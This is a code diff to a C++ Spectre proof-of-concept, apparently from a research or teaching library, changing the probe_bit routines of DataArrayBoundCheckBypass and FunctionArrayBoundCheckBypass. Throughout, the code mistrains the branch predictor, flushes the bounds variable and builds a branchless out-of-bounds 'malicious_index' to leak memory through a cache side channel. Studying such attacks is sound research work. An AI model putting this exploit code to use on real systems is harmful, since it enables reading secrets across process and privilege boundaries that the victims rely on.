@@ -31,18 +31,18 @@ spectre::FunctionArray::~FunctionArray() {
 
 
 
-void spectre::DataArrayBoundCheckBypass::probe_bit(uint8_t mask, const uint8_t* data, const uint8_t* cache_probe) {
+void spectre::DataArrayBoundCheckBypass::probe_bit(int tries, uint8_t mask, const uint8_t* data, const uint8_t* cache_probe) {
     size_t malicious_index = data - this->data_array.array;
     size_t max_training_index = this->data_array.array_size;
 
-    for (int i = 9; i >= 0; i--) {
-        size_t training_index = (mask + i) % max_training_index;
+    for (int i = 11; i >= 0; i--) {
+        size_t training_index = (tries + i) % max_training_index;
         libflush.flush(&this->data_array.array_size);
         fence();
 
         // Bit twiddling to set index=training_index if i%6!=0 or malicious_x if i%6==0
         // Avoid jumps in case those tip off the branch predictor
-        size_t index = ((i % 10) - 1) & ~0xFFFF;  // Set index=FFF.FF0000 if i%6==0, else index=0
+        size_t index = ((i % 6) - 1) & ~0xFFFF;  // Set index=FFF.FF0000 if i%6==0, else index=0
         index = (index | (index >> 16));  // Set index=-1 if i&6=0, else index=0
         index = training_index ^ (index & (malicious_index ^ training_index));
 
@@ -61,7 +61,7 @@ void spectre::FunctionArrayBoundCheckBypass::exploit(uint8_t mask, const uint8_t
     volatile uint8_t tmp = cache_probe[(value & mask) * CACHE_LINE_SIZE];
 }
 
-void spectre::FunctionArrayBoundCheckBypass::probe_bit(uint8_t mask, const uint8_t* data, const uint8_t* cache_probe) {
+void spectre::FunctionArrayBoundCheckBypass::probe_bit(int tries, uint8_t mask, const uint8_t* data, const uint8_t* cache_probe) {
     FunctionArray::function_ptr_t fake_array[] = {
         FunctionArrayBoundCheckBypass::exploit
     };
